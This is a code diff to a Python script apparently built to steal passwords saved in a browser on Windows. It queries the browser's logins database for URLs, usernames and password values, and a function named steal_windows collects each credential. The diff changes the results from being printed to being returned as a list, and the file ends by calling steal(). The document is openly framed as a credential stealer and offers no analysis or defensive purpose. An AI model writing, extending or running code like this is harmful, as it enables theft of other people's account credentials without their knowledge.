@@ -20,15 +20,12 @@ def queryDB(DBpath):
 		conn = sqlite3.connect(DBpath)
 		cursor = conn.cursor()
 	except:
-		print "[-] Couldn't open the database"
-		return
-
-	#Pull encryped passwords from database.
+		return ('[-] Couldn\'t open the database')
+	# Execute the query
 	try:
 		cursor.execute('SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT \'\' OR password_value IS NOT \'\'')
 	except:
-		print '[-] Error getting the passwords'
-		return
+		return ('[-] Error getting the passwords')
 	# Fetch all data
 	return cursor.fetchall()
 
@@ -114,11 +111,10 @@ def steal_windows():
 				# If the URL is blank,print it as (Unknown)
 				if(len(result[0]) <= 0):
 					result[0] = "(Unknown)"
-					# Print the result
-					print ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
-					return
+				# Print the result
+				ret.append ("[+] URL:{url}\n    Username:{user}\n    Password:{pass_}\n".format(url=result[0],user=result[1],pass_=password))
+		return ret
 	else:
-		print('[-] There are no passwords')
-		return
+		return ('[-] There are no passwords')
 
 steal()
